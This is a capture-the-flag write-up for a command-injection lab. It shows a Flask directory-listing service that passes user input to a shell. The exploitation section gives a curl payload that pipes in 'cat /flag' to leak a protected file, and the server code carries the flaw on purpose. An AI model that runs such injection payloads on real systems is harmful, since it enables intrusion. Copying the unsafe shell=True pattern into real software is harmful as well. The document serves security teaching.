# CMDi2

## Challenge Description

The challenge provides a web service that allows users to browse directories. The vulnerable endpoint is:

The backend constructs and executes a shell command using the user’s `topdir` parameter. For example:

## server

```python
#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/quest", methods=["GET"])
def challenge():
    arg = flask.request.args.get("topdir", "/challenge").replace(";", "")
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/quest"><input type=text name=topdir><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```

## Vulnerability

The user input is concatenated directly into a shell command string.

The command is executed with `shell=True`, which means shell metacharacters like `|, ;`, or && are interpreted by the shell.

This allows arbitrary commands to be executed by appending them to the input.

## Exploitation

By injecting `| cat /flag`, the attacker can trick the shell into executing an additional command to print the contents of `/flag`.

### Payload

```SHELL
curl "http://challenge.localhost:80/quest?topdir=/flag%20|%20cat%20/flag"
```

### Command Executed on Server:

```SHELL
ls -l /flag | cat /flag
```

* ls -l /flag tries to list the file.

* | cat /flag pipes the contents of the flag file into the output stream.

* The response HTML includes the flag.

## Conclusion


This challenge demonstrates Command Injection via pipe (`|`) injection. By injecting `| cat /flag` into the topdir parameter, we successfully executed an unintended command and leaked the contents of the protected flag file.

